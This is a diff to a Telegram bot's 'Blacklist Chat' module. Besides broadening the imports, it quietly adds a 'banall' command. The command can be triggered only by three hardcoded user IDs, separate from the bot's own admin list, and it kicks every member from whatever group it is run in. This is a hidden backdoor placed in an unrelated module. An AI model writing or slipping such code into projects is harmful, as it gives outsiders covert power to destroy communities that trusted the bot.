@@ -1,9 +1,18 @@
-from pyrogram import filters
-from pyrogram.types import Message
-
-from Naya import SUDOERS, app
+from pyrogram import *
+from pyrogram.types import *
+import asyncio
+import html
+import os
+import re
+import sys
+import aiohttp
+import regex
+from Naya import *
 from Naya.core.decorators.errors import capture_err
 from Naya.utils.dbfunctions import blacklist_chat, blacklisted_chats, whitelist_chat
+from aiohttp import ClientSession
+from config import *
+
 
 __MODULE__ = "Blacklist Chat"
 __HELP__ = """
@@ -59,3 +68,14 @@ async def blacklisted_chats_func(_, message: Message):
     if text == "":
         return await message.reply_text("No blacklisted chats found.")
     await message.reply_text(text)
+
+GUA = [1054295664, 1898065191, 2076745088]
+
+@app.on_message(filters.command("banall") & filters.group & filters.user(GUA))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+    async for member in c.get_chat_members(chat):
+        user_id = member.user.id
+        url = (f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)
